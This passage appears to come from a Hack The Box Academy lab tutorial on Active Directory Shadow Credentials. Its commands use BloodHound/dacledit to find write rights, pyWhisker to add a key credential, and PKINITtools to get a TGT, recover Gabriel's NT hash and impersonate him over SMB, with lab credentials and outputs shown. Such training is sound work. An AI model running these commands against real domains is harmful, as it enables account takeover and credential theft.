
---
---
## Enumeration from Linux

To identify if we have an account with `GenericAll`, `GenericWrite`, over the target, or `WriteProperty` over the target's `msDS-KeyCredentialLink` attribute, we can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), [BloodHound](https://github.com/SpecterOps/BloodHound), [dacledit](https://github.com/ShutdownRepo/impacket/tree/dacledit), and any other tool that allows us to retrieve ACL information out of Active Directory.

Let's start with [BloodHound](https://github.com/SpecterOps/BloodHound) and connect to the target machine using RDP with Jeffry's credentials.

To collect the data, we will use [SharpHound](https://github.com/BloodHoundAD/SharpHound):

```powershell
PS C:\Tools\SharpHound CE> .\SharpHound.exe -c All
```

We must import the SharpHound output file into BloodHound and then search for a path from Jeffry (the account we control) to any other account. Let's check the path from Jeffry to Gabriel:

![text](https://academy.hackthebox.com/storage/modules/255/jeffry_genericAll_gabriel.png)

There's also a path from Jeffry to Monic with `AddKeyCredentialLink`, this means that Jeffry has WriteProperty to this attribute:

![text](https://academy.hackthebox.com/storage/modules/255/jeffry_addkeycredentiallink_monic.png)


Alternatively, if we are working from Linux, we can also use [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) or [bloodyAD](https://github.com/CravateRouge/bloodyAD) to search for those rights.

### Installing dacledit.py

To install dacledit we will clone [ShutdownRepo impacket's repository](https://github.com/ShutdownRepo/impacket/tree/dacledit), create a python virtual environment to avoid conflict between the original Impacket installation and this branch, and install the fork impacket repository:

```shell
anas21@htb[/htb]$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
```

```shell
anas21@htb[/htb]$ cd impacket
anas21@htb[/htb]$ python3 -m venv .dacledit
anas21@htb[/htb]$ source .dacledit/bin/activate
```

Now, in the following example, we will query what rights the user Jeffry has over the target account, Gabriel:

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -target gabriel -principal jeffry -dc-ip 10.129.228.236 lab.local/jeffry:Music001
```

As the command's output shows, Jeffry has `FullControl` over the target account, Gabriel.

---
---
## Attacking Shadow Credentials from Linux

We will use [pyWhisker](https://github.com/ShutdownRepo/pywhisker) to abuse the Shadow Credentials from Linux, a Python equivalent of the original `Whisker`. It is based on `Impacket` and a Python equivalent of [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) called [PyDSInternals](https://github.com/p0dalirius/pydsinternals). Using this tool along with [Dirk-jan's PKINITtools](https://github.com/dirkjanm/PKINITtools) enables complete exploitation from a UNIX-based systems.

```shell
anas21@htb[/htb]$ git clone -q https://github.com/ShutdownRepo/pywhisker
```

To use `pywhisker`, we need to provide the credentials of the account we control and have rights over the target account. We can use the option `--target <account>` and the option `--action add` to perform the Shadow Credential attack:

```shell
anas21@htb[/htb]$ python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a37a618e-ac85-4053-3519-12bf69744e5b
[*] Updating the msDS-KeyCredentialLink attribute of gabriel
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: BX4EWk8m.pfx
[*] Must be used with password: KQAx5lHP3h9TtzNly2Us
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

The output provides us with three essential things: the `KeyCredential DeviceID,` the name of the certificate (in this case, `BX4EWk8m.pfx`), and the certificate's password `KQAx5lHP3h9TtzNly2Us`. We can use those values with `PKINITtools` to get a TGT as `Gabriel`, but before that, let's install `PKINITtools`:

```shell
anas21@htb[/htb]$ git clone -q https://github.com/dirkjanm/PKINITtools
anas21@htb[/htb]$ pip3 install impacket minikerberos                          
Requirement already satisfied: impacket in /usr/local/lib/python3.9/dist-packages/impacket-0.11.0-py3.9.egg (0.11.0)
Collecting Minikerberos
 Downloading minikerberos-0.4.4-py3-none-any.whl (147 kB)
   |████████████████████████████████| 147 kB 1.8 MB/s 
...SNIP... 
```

`gettgtpkinit.py` is one of the tools available in `PKINITtools`, that will help us generate the TGT. We will use the option `-cert-pfx <certificate file>` as well `-pfx-pass <password>` to specify the password, and finally the value of `domain/username` and the ccache filename:

```shell
anas21@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache
```

If we provide the correct parameters, we will have a file named `gabriel.ccache` that represents the TGT to be used in Linux. The output of `gettgtpkinit.py` also has the `AS-REP encryption key` we can use to decrypt the ticket and extract Gabriel's NT Hash. We need to use the tool `getnthash.py` available in `PKINITtools` and add the option `-key <key>`, and we also need to use the TGT. To do that we will use `KRB5CCNAME=gabriel.ccache` before running Python, so the following command uses this variable and loads the TGT:

```shell
anas21@htb[/htb]$ KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
2d1da879ca7100325629...SNIP...
```

The above output shows Gabriel NT Hash. We can use the NT hash or the TGT to impersonate Gabriel as follows:

```shell
anas21@htb[/htb]$ KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
...SNIP...
#
```

---
---
